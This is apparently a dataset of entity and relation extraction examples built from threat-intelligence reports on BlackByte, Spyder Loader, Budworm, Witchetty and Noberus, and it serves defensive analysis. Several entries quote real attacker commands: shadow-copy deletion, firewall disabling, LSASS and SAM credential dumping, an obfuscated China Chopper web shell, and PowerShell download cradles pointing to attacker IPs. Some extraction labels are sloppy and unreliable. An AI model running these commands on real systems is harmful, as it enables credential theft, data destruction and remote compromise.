(http://msdl.microsoft.com/download/symbols/ntkrnlmp.pdb/11D60DB07BA7433B923F49867DF515721/ntkrnlmp.pdb, url), (ntkrnlmp.pdb, file), (ntoskrnl.exe, file)\n\nRelationships: (BlackByte, exploit, CVE-2021-34473), (BlackByte, exploit, CVE-2021-34523), (BlackByte, exploit, CVE-2021-31207), (BlackByte, exploit, CVE-2021-26855), (BlackByte, use, Microsoft Exchange Servers), (BlackByte, use, AdFind), (BlackByte, use, AnyDesk), (BlackByte, use, NetScan), (BlackByte, use, PowerView), (BlackByte, download from, http://msdl.microsoft.com/download/symbols/ntkrnlmp.pdb/11D60DB07BA7433B923F49867DF515721/ntkrnlmp.pdb), (BlackByte, download, ntkrnlmp.pdb), (BlackByte, check, ntoskrnl.exe)"}
{"instruction": "BlackByte then proceeds with the removal of Kernel Notify Routines. The purpose of this is to attempt to bypass EDR products. This functionality in BlackByte has already been documented by Sophos and it closely resembles the techniques leveraged in the EDRSandblast tool . BlackByte uses VssAdmin to delete volume shadow copies and resize storage allocation: cmd.exe /c start vssadmin.exe Delete Shadows /All /Quiet vssadmin Resize ShadowStorage /For=K: /On=K: /MaxSize=401MB It then makes the following service modifications: sc create ODosTEmONa binPath= CSIDL_SYSTEM_DRIVE\\systemdata\\generalate type= kernel sc.exe config RemoteRegistry start= auto sc.exe config Dnscache start= auto sc.exe config SSDPSRV start= auto sc.exe config fdPHost start= auto sc.exe config upnphost start= auto The ransomware then modifies firewall settings to enable linked connections: netsh advfirewall firewall set rule \"group=\\\"Network Discovery\\\" \" new enable=Yes\" netsh advfirewall firewall set rule \"group=\\\"File and Printer Sharing\\\" \" new enable=Yes\" cmd.exe /c netsh advfirewall set allprofiles state off", "input": null, "output": "Named Entities: (BlackByte, malware), (VssAdmin, tool), (cmd.exe, file), (vssadmin.exe, file), (sc.exe, file)\n\nRelationships:  (BlackByte, use, VssAdmin), (BlackByte, use, cmd.exe), (BlackByte, use, vssadmin.exe), (BlackByte, use, sc.exe)"}
{"instruction": "Finally, BlackByte injects itself into an instance of svchost.exe, conducts file encryption, and then deletes the ransomware binary on disk: cmd.exe /c ping 1.1.1.1 -n 10 > Nul & Del CSIDL_WINDOWS\\rdac.exe /F /Q CSIDL_SYSTEM\\svchost.exe -s 27262842", "input": null, "output": "Named Entities: (BlackByte, malware), (svchost.exe, file), (rdac.exe, file), (1.1.1.1, IP)\nRelationships: (BlackByte, inject, svchost.exe), (svchost.exe, delete, rdac.exe),  (svchost.exe, ping, 1.1.1.1)"}
{"instruction": "Emerging Force \nFollowing the departure of a number of major ransomware operations such as Conti and Sodinokibi, BlackByte has emerged as one of the ransomware actors to profit from this gap in the market. The fact that actors are now creating custom tools for use in BlackByte attacks suggests that it may be on the way to becoming one of the dominant ransomware threats.", "input": null, "output": "Named Entities:  (BlackByte, attacker), (Conti, attacker), (Sodinokibi, attacker), (ransomware operations, threat type)\nRelationships: (BlackByte, belong to, ransomware operations), (Conti, belong to, ransomware operations), (Sodinokibi, belong to, ransomware operations)"}
{"instruction": "$str1 = \").Login\" $str2 = \").NewUpload\" $str3 = \").CreateDir\" $str4 = \".PreloginMsg\" $str5 = \".UploadCompleteMsg\" $str6 = \").UploadFile\" $str7 = {FF 20 47 6F 20 62 75 69 6C 64 69 6E 66 3A 08 02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 07 75 6E 6B 6E 6F 77 6E 00 00 00 00 00 00 00 00} $c1 = {44 24 68 44 31 C2 88 50 10 0F B6 54 24 56 44 0F} $c2 = {FB 48 89 F7 4C 89 C6 E8 54 ED F6 FF 4C 8D 43 01} condition: all of ($str*) and ($c1 or $c2) and filesize > 8MB and (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) }", "input": null, "output": "No related entities and relations."}
{"instruction": "Spyder Loader: Malware Seen in Recent Campaign Targeting Organizations in Hong Kong", "input": null, "output": "Named Entities: (Spyder Loader, malware)\nRelationships: No related entities and relations."}
{"instruction": "Activity appears to be a continuation of previously documented Operation CuckooBees campaign. \nSymantec has observed a likely continuation of the Operation CuckooBees activity, this time targeting organizations in Hong Kong. \nOperation CuckooBees was first documented in May 2022 by researchers at Cybereason, who said the intelligence-gathering campaign had been operating under the radar since at least 2019, stealing intellectual property and other sensitive data from victims. \nIn the attacks observed by Symantec, the attackers remained active on some networks for more than a year. We saw the Spyder Loader (Trojan.Spyload) malware deployed on victim networks, indicating this activity is likely part of that ongoing campaign. While we did not see the ultimate payload in this campaign, based on the previous activity seen alongside the Spyder Loader malware it seems likely the ultimate goal of this activity was intelligence collection.", "input": null, "output": "Named Entities: (Operation CuckooBees, attacker), (Spyder Loader, malware), (Trojan.Spyload, malware), (intelligence collection, threat type)\nRelationships: (Operation CuckooBees, use, Spyder Loader), (Spyder Loader, aka, Trojan.Spyload), (Spyder Loader, goal, intelligence collection)"}
{"instruction": "Background to Operation CuckooBees The Spyder Loader malware was first discussed publicly in a March 2021 blog by SonicWall , with the researchers saying at the time that the malware was \u201cbeing used for targeted attacks on information storage systems, collecting information about corrupted devices, executing mischievous payloads, coordinating script execution, and C&C server communication.\u201d", "input": null, "output": "Named Entities: (Operation CuckooBees, attacker), (Spyder Loader, malware), (C&C server, tool)\nRelationships: (Operation CuckooBees, use, Spyder Loader), (Spyder Loader, use, C&C server)"}
{"instruction": "These initial findings were expanded on substantially in a detailed Cybereason investigation published in May 2022 , which detailed a long-running campaign that the researchers dubbed Operation CuckooBees. They said that this campaign had been ongoing since at least 2019. The researchers said that the attackers exfiltrated hundreds of gigabytes of information and that they \u201ctargeted intellectual property developed by the victims, including sensitive documents, blueprints, diagrams, formulas, and manufacturing-related proprietary data.\u201d They also stole data that could be leveraged for use in future cyber attacks \u2014 such as credentials, customer data, and information about network architecture. Among the tools used in that campaign was the Spyder Loader malware, which is what was also observed in the activity seen by Symantec researchers.", "input": null, "output": "Named Entities: (Operation CuckooBees, attacker), (Spyder Loader, malware), \nRelationships: (Spyder Loader, used in, Operation CuckooBees)"}
{"instruction": "Spyder Loader - Technical Details The loader sample analyzed by Symantec researchers is compiled as a 64-bit PE DLL. It is a modified copy of sqlite3.dll, with the following malicious export added: sqlite3_prepare_v4 The sqlite3_prepare_v4 export expects a string as its third argument. Reportedly, whenever an export is executed by rundll32.exe, the third argument of the called export should contain part of the process command-line. When this loader is executed, it extracts the file name from its third argument, and the referred file is expected to contain a sequence of records. Each record has the following structure: Offset Size Description 0 DWORD blob_id 4 DWORD blob_size 8 DWORD blob_cksum 0x0c blob_size BYTEs encrypted_blob", "input": null, "output": "Named Entities: (Spyder Loader, malware), (sqlite3.dll, file), (rundll32.exe, file)\nRelationships:(Spyder Loader, modified copy of, sqlite3.dll)"}
{"instruction": "At minimum, the malware sample requires records storing blob_ids 1 and 2. The sample also checks for the optional blob_ids 3 and 4. For blob_ids 1 and 2, the content of encrypted_blob is encrypted using the AES algorithm in Ciphertext Feedback (CFB) mode with segment_size of 0x80 bits. The encryption key is based on the name of an affected computer per GetComputerNameW() API: def generate_aes_key(): computer_name = [obtained via GetComputerNameW()] hash = hashlib.sha256(computer_name.upper()) digest = hash.digest() return digest[: 0x10] And the initialization vector (IV) is derived from the corresponding record header: def generate_aes_IV(): return struct.pack(\"<IIII\", blob_id, blob_size, blob_cksum, 0) Then the sample creates FileMapping with the following parameters: hFile = INVALID_HANDLE_VALUE, dwMaximumSizeLow = sum of blob_sizes for blob_ids 2, 3 and 4, lpName = \"Global\\{94803275-9AEA-474E-A8F7-904EDE192BF4}\" Next, it populates the created FileMapping with: a copy of record storing blob_id 2, but decrypting the content of field encrypted_blob,", "input": null, "output": "No related entities and relations."}
{"instruction": "(if present) copy of record storing blob_id 3, and (if present) copy of record storing blob_id 4. Then it checks the status of service IKEEXT and stops the service, if running. Next, it drops the decrypted content of blob_id 1 as the following file, before starting the service: [SystemDirectory]\\wlbsctrl.dll This is apparently intended to execute the created wlbsctrl.dll file. It is likely that this file acts as a next-stage loader that executes the content of blob_id 2 from the created FileMapping. It is possible that the remaining optional blobs could then be used for follow-up stages and/or configuration data. However, as Symantec researchers did not observe these additional content blobs being executed, this is speculative.", "input": null, "output": "Named Entities: (wlbsctrl.dll, file)\nRelationships: No related entities and relations."}
{"instruction": "As previously mentioned, AES encryption is used where the sample uses the CryptoPP C++ library, but ChaCha20 algorithm encryption is also used to obfuscate one of the strings. The malware also cleans up created artifacts, overwriting the content of the dropped wlbsctrl.dll file before deleting it, for example. These steps are most likely taken in order to prevent the activity being analyzed. Debug strings also indicated that the source code location of the malware was the following: e:\\works\\2021\\stonev4-legacy\\cryptopp_5_6_4\\cryptopp\\secblock.h Similarities between this activity and the Spyder Loader activity described by Cybereason include: Use of a modified version of sqlite3.dll rundll32.exe command-line example seen in Cybereason\u2019s research seems consistent with how the third parameter of malicious export is used in this sample Use of the CryptoPP C++ library", "input": null, "output": "Named Entities: (wlbsctrl.dll file, file), (e:\\works\\2021\\stonev4-legacy\\cryptopp_5_6_4\\cryptopp\\secblock.h, file), (Spyder Loader, malware), (sqlite3.dll, file), (rundll32.exe, file)\nRelationships: (wlbsctrl.dll file, overwritten by, malware), (e:\\works\\2021\\stonev4-legacy\\cryptopp_5_6_4\\cryptopp\\secblock.h, source code location of, malware), (Spyder Loader, use, sqlite3.dll), (Spyder Loader, use, rundll32.exe),"}
{"instruction": "These various similarities led us to conclude that this sample was also a version of the Spyder Loader malware. We saw various variants of Spyder Loader on victim networks, all displaying largely the same functionality.", "input": null, "output": "Named Entities: (Spyder Loader, malware)\nRelationships: No related entities and relations."}
{"instruction": "Other Activity on Victim Networks \nWe saw assorted other malware samples that carried out various other types of activity on victim networks, including a modified SQLite DLL with the malicious export sqlite3_extension_init, which creates and starts a service named GeneralManintenanceWork for a file named data.dat. We also saw Mimikatz being executed on victim networks, as well as a Trojanized ZLib DLL that had multiple malicious exports, one of which appeared to be waiting for communication from a command-and-control (C&C) server, while the other would load a payload from the provided file name in the command-line. \nAnother sample installs and runs the below component of winpcap as a service: \nIt accepts either -i or -v as a parameter \n-i installs and runs a service \n-v checks if winpcap is already installed \nFiles with the names npf.sys and packet.dll are then installed.", "input": null, "output": "Named Entities: (data.dat, file), (Mimikatz, malware), (command-and-control (C&C) server, tool), (winpcap, tool), (npf.sys, file), (packet.dll, file)\nRelationships:  (SQLite DLL, start, data.dat), (Mimikatz, execute on, victim networks), (ZLib DLL, export, command-and-control (C&C) server), (npf.sys, install, winpcap), (packet.dll, install, winpcap)"}
{"instruction": "Intelligence Gathering the Likely Goal \nWhile we do not see the final payload delivered in this campaign, the use of the Spyder Loader malware and crossover with the activity previously identified by SonicWall and Cybereason, combined with the victims seen in this recent activity, make it most likely that the motivation behind this activity is intelligence gathering. \nThe fact that this campaign has been ongoing for several years, with different variants of the Spyder Loader malware deployed in that time, indicates that the actors behind this activity are persistent and focused adversaries, with the ability to carry out stealthy operations on victim networks over a long period of time. Companies that hold valuable intellectual property should ensure that they have taken all reasonable steps to keep their networks protected from this kind of activity.", "input": null, "output": "Named Entities: (Spyder Loader, malware),\nRelationships: No related entities and relations."}
{"instruction": "Budworm: Espionage Group Returns to Targeting U.S. Organizations", "input": null, "output": "Named Entities: (Budworm, attacker)\nRelationships: No related entities and relations."}
{"instruction": "Recent attacks by group have spanned continents and include first confirmed attacks seen against the U.S. in a number of years. \nThe Budworm espionage group has mounted attacks over the past six months against a number of strategically significant targets, including the government of a Middle Eastern country, a multinational electronics manufacturer, and a U.S. state legislature. The latter attack is the first time in a number of years Symantec has seen Budworm targeting a U.S-based entity. Along with the above high-value targets, the group also conducted an attack against a hospital in South East Asia.", "input": null, "output": "Named Entities: (Budworm, attacker), (espionage group, threat type)\nRelationships: (Budworm,belong to, espionage group)"}
{"instruction": "Current toolset In recent attacks, Budworm leveraged the Log4j vulnerabilities ( CVE-2021-44228 and CVE-2021-45105 ) to compromise the Apache Tomcat service on servers in order to install web shells. The attackers used Virtual Private Servers (VPS) hosted on Vultr and Telstra as command-and-control (C&C) servers. Budworm\u2019s main payload continues to be the HyperBro malware family, which is often loaded using a technique known as dynamic-link library (DLL) side-loading. This involves the attackers placing a malicious DLL in a directory where a legitimate DLL is expected to be found. The attacker then runs the legitimate application (having installed it themselves). The legitimate application then loads and executes the payload.", "input": null, "output": "Named Entities: (Budworm, attacker), (CVE-2021-44228, vulnerability), (CVE-2021-45105, vulnerability), (Virtual Private Servers, tool), (HyperBro malware family, malware)\nRelationships: (Budworm, leverage, CVE-2021-44228), (LBudworm, leverage, CVE-2021-45105), (Budworm, use, Virtual Private Servers), (Budworm, payload, HyperBro malware family)"}
{"instruction": "In recent attacks, Budworm has used the endpoint privilege management software CyberArk Viewfinity to perform side-loading. The binary, which has the default name vf_host.exe, is usually renamed by the attackers in order to masquerade as a more innocuous file. Masqueraded names included securityhealthservice.exe, secu.exe, vfhost.exe, vxhost.exe, vx.exe, and v.exe. In some cases, the HyperBro backdoor was loaded with its own HyperBro loader (file names: peloader.exe, 12.exe). It is designed to load malicious DLLs and encrypt payloads. While HyperBro was frequently used, the attackers also used the PlugX/Korplug Trojan as a payload at times. Other tools used in recent attacks include: Cobalt Strike: An off-the-shelf tool that can be used to load shellcode onto victim machines. It has legitimate uses as a penetration testing tool but is frequently exploited by malicious actors. LaZagne: A publicly available credential dumping tool. IOX: A publicly available proxy and port-forwarding tool.", "input": null, "output": "Named Entities: (Budworm, malware), (CyberArk Viewfinity, tool), (vf_host.exe, file), (securityhealthservice.exe, file), (secu.exe,file), (vfhost.exe, file), (vxhost.exe, file), (vx.exe, file), (v.exe, file), (HyperBro, malware), (HyperBro loader, tool), (peloader.exe, file), (12.exe, file), (PlugX/Korplug Trojan, malware), (Cobalt Strike, tool), (LaZagne, tool), (IOX, tool)\nRelationships: (Budworm, use, CyberArk Viewfinity), (CyberArk Viewfinity, file, vf_host.exe), (vf_host.exe, masqueraded names, securityhealthservice.exe), (vf_host.exe, masqueraded names, secu.exe), (vf_host.exe, masqueraded names, vfhost.exe), (vf_host.exe, masqueraded names, vxhost.exe), (vf_host.exe, masqueraded names, vx.exe), (vf_host.exe, masqueraded names, v.exe), (HyperBro, load, HyperBro loader), (HyperBro loader, file name, peloader.exe), (HyperBro loader, file name, 12.exe), (Budworm, use, PlugX/Korplug Trojan), (Budworm, use, Cobalt Strike), (Budworm, use, LaZagne), (Budworm, use, IOX)"}
{"instruction": "Fast Reverse Proxy (FRP): A reverse proxy tool. Fscan: A publicly available intranet scanning tool.", "input": null, "output": "Named Entities: (Fast Reverse Proxy (FRP), tool), (Fscan, tool)\nRelationships: No related entities and relations."}
{"instruction": "Conclusion \nBudworm is known for mounting ambitious attacks against high-value targets. While there were frequent reports of Budworm targeting U.S. organizations six to eight years ago, in more recent years the group\u2019s activity appears to have been largely focused on Asia, the Middle East, and Europe. However this is the second time in recent months, Budworm has been linked to attacks against a U.S-based target. A recent CISA report on multiple APT groups attacking a defense sector organization mentioned Budworm\u2019s toolset. A resumption of attacks against U.S.-based targets could signal a change in focus for the group.", "input": null, "output": "Named Entities: (Budworm, attacker)\nRelationships: No related entities and relations."}
{"instruction": "Witchetty: Group Uses Updated Toolset in Attacks on Governments in Middle East", "input": null, "output": "Named Entities: (Witchetty, attacker)\nRelationships: No related entities and relations."}
{"instruction": "Espionage group begins using new backdoor that leverages rarely seen steganography technique. \nThe Witchetty espionage group (aka LookingFrog) has been progressively updating its toolset, using new malware in attacks on targets in the Middle East and Africa. Among the new tools being used by the group is a backdoor Trojan (Backdoor.Stegmap) that employs steganography, a rarely seen technique where malicious code is hidden within an image. \nIn attacks between February and September 2022, Witchetty targeted the governments of two Middle Eastern countries and the stock exchange of an African nation. The attackers exploited the ProxyShell ( CVE-2021-34473 , CVE-2021-34523 , and CVE-2021-31207 ) and ProxyLogon ( CVE-2021-26855 and CVE-2021-27065 ) vulnerabilities to install web shells on public-facing servers before stealing credentials, moving laterally across networks, and installing malware on other computers.", "input": null, "output": "Named Entities: (Espionage group, threat type), (Witchetty, attacker), (LookingFrog, attacker), (Backdoor.Stegmap, malware),(CVE-2021-34473, vulnerability), (CVE-2021-34523, vulnerability), (CVE-2021-31207, vulnerability), (CVE-2021-26855, vulnerability), (CVE-2021-27065, vulnerability)\n\nRelationships: (Witchetty, aka, LookingFrog), (Witchetty, use, Backdoor.Stegmap), (Witchetty, exploit, CVE-2021-34473), (Witchetty, exploit, CVE-2021-34523), (Witchetty, exploit, CVE-2021-31207), (Witchetty, exploit, CVE-2021-26855), (Witchetty, exploit, CVE-2021-27065)"}
{"instruction": "Who is Witchetty? \nWitchetty was first documented by ESET in April 2022, who concluded that it was one of three sub-groups of TA410, a broad cyber-espionage operation with some links to the Cicada group (aka APT10). Witchetty\u2019s activity was characterized by the use of two pieces of malware, a first-stage backdoor known as X4 and a second-stage payload known as LookBack. ESET reported that the group had targeted governments, diplomatic missions, charities, and industrial/manufacturing organizations.", "input": null, "output": "Named Entities: (Witchetty, attacker), (TA410, attacker), (Cicada group, attacker), (APT10, attacker), (X4, malware), (LookBack, malware)\nRelationships: (Witchetty, sub-group of, TA410), (TA410, linked to, Cicada group), (Cicada group, aka, APT10), (Witchetty, use, X4), (Witchetty, use, LookBack)"}
{"instruction": "New tooling While the group has continued to use the LookBack backdoor, several new pieces of malware appear to have been added to its toolset. One is Backdoor.Stegmap, which leverages steganography to extract its payload from a bitmap image. Although rarely used by attackers, if successfully executed, steganography can be leveraged to disguise malicious code in seemingly innocuous-looking image files. A DLL loader downloads a bitmap file from a GitHub repository. The file appears to be simply an old Microsoft Windows logo. However, the payload is hidden within the file and is decrypted with an XOR key. Figure 1. The image that the attackers used to hide the payload Disguising the payload in this fashion allowed the attackers to host it on a free, trusted service. Downloads from trusted hosts such as GitHub are far less likely to raise red flags than downloads from an attacker-controlled command-and-control (C&C) server.", "input": null, "output": "Named Entities: (LookBack, malware), (Backdoor.Stegmap, malware)\nRelationships: (LookBack, use, Backdoor.Stegmap)"}
{"instruction": "The payload is a fully featured backdoor capable of executing the following commands: Table 1. Backdoor.Stegmap commands Code Command 6 Create a directory 7 Remove a directory 8 Copy files 9 Move files 10 Delete files 11 Start a new process 12 Download and run an executable from [REMOTE HOSTNAME]/master/cdn/site.htm 13 Unknown (Possibly reading standard output from a process created by command 12) 14 Terminate the process created by command 12 15 Steal a local file 19 Enumerate processes 20 Kill a process 21 Read a registry key 22 Create a registry key 23 Set a registry key value 24 Delete a registry key Other new tools used by the attackers include:", "input": null, "output": "Named Entities: (Backdoor.Stegmap, malware)\nRelationships: No related entities and relations."}
{"instruction": "Custom proxy utility: This implements a protocol that is quite like SOCKS5, but in this case, the infected computer acts as the server and connects to a C&C server acting as a client, instead of the other way around. Custom port scanner: Scans the network ports in the subnet as explained by the banner. Custom persistence utility: Adds itself to autostart in the registry as \u201cNVIDIA display core component\u201d (using regsrv32).", "input": null, "output": "Named Entities: (Custom proxy utility, tool), (C&C server, tool), (Custom port scanner, tool), (Custom persistence utility, tool), (regsrv32, tool)\nRelationships: (Custom proxy utility, connect to, C&C server), (Custom persistence utility, use, regsrv32)"}
{"instruction": "Witchetty attack chain In one attack against a government agency in the Middle East, the first sign of malicious activity occurred on February 27, 2022 when the attackers exploited the ProxyShell vulnerability to dump the memory of the Local Security Authority Subsystem Service (LSASS) process using the comsvcs.dll file. rundll32.exe CSIDL_SYSTEM\\comsvcs.dll, MiniDump 1036 CSIDL_PROFILE\\public\\dm.db full The next day, the attackers tried to dump the LSASS process using PowerShell on a different Exchange Server. powershell -exec bypass $p=Get-Process lsass;$f=New-Object IO.FileStream('CSIDL_COMMON_MUSIC\\d',[IO.FileMode]::Create);((([PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')) .GetNestedType('NativeMethods','NonPublic')).GetMethod('MiniDumpWriteDump',([Reflection.BindingFlags]'NonPublic,Static'))).Invoke($null,@($p.Handle,$p.Id,$f.SafeFileHandle, ([UInt32]2),[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero));$f.Close() On March 2, the attackers launched a PowerShell command to obtain a list of Windows Server machines in the victim environment. cmd.exe\" /c powershell -exec bypass Get-ADComputer -Filter {(OperatingSystem -like \"*windows*server*\") -and (Enabled -eq \"True\")} -Properties OperatingSystem | Sort Name [REDACTED] select -Unique OperatingSystem\" Malicious activity ceased until March 18 when the attackers returned to the server and used a custom tool that resembled Mimikatz (file name: dd.exe).", "input": null, "output": "Named Entities: (Witchetty, attacker), (Subsystem Service, tool) (comsvcs.dll, file), (rundll32.exe, file), (CSIDL_SYSTEM\\comsvcs.dll, file), (1036 CSIDL_PROFILE\\public\\dm.db, file), (Mimikatz, tool), (dd.exe, file)\n\nRelationships: (Witchetty, exploit, Subsystem Service), (Witchetty, use, Mimikatz), (Mimikatz, file, dd.exe)"}
{"instruction": "dd.exe -domain:[REDACTED] -dc:MODDC1.[REDACTED] -user:[REDACTED] -ntlm:[REDACTED] -pwdump -all Malicious activity again ceased for some time. On April 26 and 27, the attackers ran commands to find the process identifier (PID) of the LSASS process and attempted to dump it with the technique previously seen. cmd /c tasklist | findstr lsass.exe >> CSIDL_WINDOWS\\temp\\8b7db7a3-5376-4d32-8be1-0d3092117022-microsoft.tmp rundll32 CSIDL_SYSTEM\\comsvcs.dll,minidump 1036 CSIDL_SYSTEM_DRIVE\\inetpub\\wwwroot\\aspnet_client\\temp.rar full Next, on April 29, the attackers dumped the Security Account Manager (SAM) Registry Hive using the Windows reg.exe tool. reg save hklm\\sam CSIDL_SYSTEM_DRIVE\\inetpub\\wwwroot\\aspnet_client\\sam.hive Between May 7 and May 9, the attackers checked the PowerShell Execution Policy and then ran the LookBack backdoor and registered it as a scheduled task on the server. powershell Get-ExecutionPolicy rundll32 CSIDL_WINDOWS\\immersivecontrolpanel\\ieupdate.dll, curl_share_init schtasks /create /tn \"InternetExplorerTaskMachineCore\" /sc daily /st 05:30 /tr \"CSIDL_WINDOWS\\immersivecontrolpanel\\ieupdate.dll\" /ru \"System\" /rl highest schtasks /run /tn \"InternetExplorerTaskMachineCore\"", "input": null, "output": "Named Entities: (dd.exe, file), (CSIDL_WINDOWS\\temp\\8b7db7a3-5376-4d32-8be1-0d3092117022-microsoft.tmp, file), (CSIDL_SYSTEM\\comsvcs.dll,minidump, file), (CSIDL_SYSTEM_DRIVE\\inetpub\\wwwroot\\aspnet_client\\temp.rar, file), (CSIDL_SYSTEM_DRIVE\\inetpub\\wwwroot\\aspnet_client\\sam.hive, file), (LookBack backdoor, malware)\nRelationships: No related entities and relations."}
{"instruction": "Between June 14 and 18, the attackers used Mimikatz to dump passwords from the LSASS memory. They then saved the SAM to a remote location, before launching a PowerShell file named \u201ca.ps1\u201d, creating a new mailbox, and using the command \u201cmakecab\u201d to compress some files, likely for exfiltration. CSIDL_SYSTEM\\rundll32.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\" reg save HKLM\\SAM s.dat reg save HKLM\\SAM \\\\[REDACTED]\\C$\\ProgramData\\Microsoft\\Diagnosis\\s.dat powershell -PSConsoleFile \"CSIDL_SYSTEM_DRIVE\\program files\\microsoft\\exchange server\\v15\\bin\\exshell.psc1\" -file a.ps1 powershell -PSConsoleFile \"CSIDL_SYSTEM_DRIVE\\program files\\microsoft\\ exchange server\\v15\\bin\\exshell.psc1\" -c \"New-Mailbox -Name [REDACTED] -UserPrincipalName [REDACTED] -Password [REDACTED] -String [REDACTED] -AsPlainText -Force)\" makecab \\\\[REDACTED]\\c$\\programdata\\microsoft\\drm\\domu.csv \\\\[REDACTED]\\c$\\programdata\\microsoft\\drm\\domu.cab On July 3, the attackers created a scheduled task on a remote computer to run the whoami command and save the output to a file. They then configured WinRM to allow connections from any computer. schtasks /create /s [REDACTED] /u: [REDACTED] /p [REDACTED] /tn \"BACKUPSEC\" /sc onstart /tr cmd.exe /c whoami > c:\\windows\\temp\\1.txt /ru system /f cscript //nologo CSIDL_SYSTEM\\winrm.vbs quickconfig -q", "input": null, "output": "Named Entities: (Mimikatz, tool), (powershell, tool), (a.ps1, file), (makecab, tool), (HKLM\\SAM, file), (s.dat, file), (CSIDL_SYSTEM_DRIVE\\program files\\microsoft\\exchange server\\v15\\bin\\exshell.psc1, file), (CSIDL_SYSTEM_DRIVE\\program files\\microsoft\\ exchange server\\v15\\bin\\exshell.psc1, file), (domu.csv, file), (domu.cab, file), (WinRM, tool), (c:\\windows\\temp\\1.txt, file), (cscript, tool), (CSIDL_SYSTEM\\winrm.vbs, file)\n\nRelationships: (attackers, use, Mimikatz), (attackers, launch, a.ps1), (attackers, configure, WinRM)"}
{"instruction": "cscript //nologo CSIDL_SYSTEM\\winrm.vbs s winrm/config/Client @{TrustedHosts=\"*\"} Between July 18 and 26, the attackers used the makecab command again to compress files on a remote server. They then used the ProxyLogon exploit to install the China Chopper web shell on this server. makecab \\\\[REDACTED]\\c$\\programdata\\microsoft\\drm\\Server\\0718.ldf \\\\[REDACTED]\\c$\\programdata\\microsoft\\drm\\Server\\0718.cab cmd /c cd /d \"CSIDL_SYSTEM_DRIVE\\inetpub\\wwwroot\\aspnet_client\" & echo<%@ Page Language=\" Jscript\"%><%\\u0065\\u0076\\u0061\\u006c(\\u0052\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074.Item [\"\\u0043\\u0030\\u0030\\u004b\\u0049\\u0045\"],\"\\u0075\\u006e\\u0073\\u0061\\u0066\\u0065\");%> >> \"CSIDL_SYSTEM_DRIVE\\program files\\microsoft\\exchange server\\v15\\frontend\\httpproxy\\owa\\auth\\15.1.1979\\scripts\\premium\\flogoff.aspx\" Between July 20 and 26, the threat actors moved laterally in the network using WMIC and known credentials to try to download files from their C&C servers. wmic /node:[REDACTED] /user:[REDACTED] /password:[REDACTED] process call create powershell -exec bypass (new-object net.webclient).downloadstring('http://194.180.174.254/111') On July 21, the attackers ran their custom network scanning tool to discover more computers on the network and check for the open ports on those machines. p.exe -l [IP_LIST] -p [PORT_LIST] -t 5", "input": null, "output": "Named Entities: (p.exe, tool), (194.180.174.254, IP), (flogoff.aspx, file), (CSIDL_SYSTEM_DRIVE\\winrm.vbs, file), (0718.ldf, file), (0718.cab, file), (flogoff.aspx, file), (http://194.180.174.254/111, URL)\n\nRelationships: (CSIDL_SYSTEM_DRIVE\\inetpub\\wwwroot\\aspnet_client, write to, flogoff.aspx), (wmic, download, http://194.180.174.254/111)"}
{"instruction": "On July 28, the attackers again registered a scheduled task on a remote computer to execute the LookBack backdoor daily as the system user. cmd /c cd /d \"CSIDL_WINDOWS\\temp\\temp\" & schtasks /create /s [REDACTED] /u [REDACTED] /p [REDACTED] /tn \"SystemControlModel\" /sc DAILY /st 4:40 /tr \"cmd.exe \\c rundll32 \\\" CSIDL_SYSTEM_DRIVE\\program Files (x86)\\Internet Explorer\\SystemControlModel.dll\\\" curl_share_init\" /ru system /f On August 1, the backdoor executed on the infected computer. rundll32 CSIDL_PROGRAM_FILES\\internet explorer\\systemcontrolmodel.dll, curl_share_init On August 7, a PowerShell script executed, which, based on the name, seems to output the last login accounts on the server. CSIDL_SYSTEM\\windowspowershell\\v1.0\\powershell_ise.exe \"CSIDL_SYSTEM_DRIVE\\report\\getlastloginou.ps1\" The last sign of malicious activity occurred on September 1, when the attackers downloaded remote files, decompressed a ZIP file with a deployment tool, executed remote PowerShell scripts, and executed the custom proxy tool to contact the C&C servers. powershell -exec bypass (new-object net.webclient).downloadstring('http://185.225.19.55:8080/111') 7.exe e deployer.7z \\\\[REDACTED]\\C$\\windows\\temp\\", "input": null, "output": "Named Entities: (LookBack, malware), (CSIDL_SYSTEM_DRIVE\\program Files (x86)\\Internet Explorer\\SystemControlModel.dll, file), (CSIDL_PROGRAM_FILES\\internet explorer\\systemcontrolmodel.dll, file), (CSIDL_SYSTEM\\windowspowershell\\v1.0\\powershell_ise.exe, file), (CSIDL_SYSTEM_DRIVE\\report\\getlastloginou.ps1, file), (http://185.225.19.55:8080/111, URL), (7.exe, file), (deployer.7z, file)\n\nRelationships: (LookBack, execute, backdoor), (185.225.19.55:8080/111, download, remote files)"}
{"instruction": "wmic /node:[REDACTED] /user:[REDACTED] /password:[REDACTED] process call create cmd /c powershell -exec bypass (new-object net.webclient).downloadstring('http://185.225.19.55/111.txt') repro.exe 185.225.19.55 80", "input": null, "output": "Named Entities: (wmic, tool), (cmd.exe, file), (powershell, tool), (185.225.19.55, IP), (111.txt, file), (repro.exe, file)\n\nRelationships: (wmic, execute, cmd.exe), (cmd.exe, execute, powershell), (powershell, download, 185.225.19.55/111.txt), (repro.exe, connect to, 185.225.19.55:80)"}
{"instruction": "Capable threat actor \nWitchetty has demonstrated the ability to continually refine and refresh its toolset in order to compromise targets of interest. Exploitation of vulnerabilities on public-facing servers provides it with a route into organizations, while custom tools paired with adept use of living-off-the-land tactics allow it to maintain a long-term, persistent presence in targeted organizations.", "input": null, "output": "Named Entities: (Witchetty, attacker),\nRelationships: No related entities and relations."}
{"instruction": "Noberus Ransomware: Darkside and BlackMatter Successor Continues to Evolve its Tactics", "input": null, "output": "Named Entities: (Noberus Ransomware, malware), (Darkside, malware), (BlackMatter, malware)\nRelationships: (Noberus Ransomware, successor, Darkside), (Noberus Ransomware, successor, BlackMatter)"}
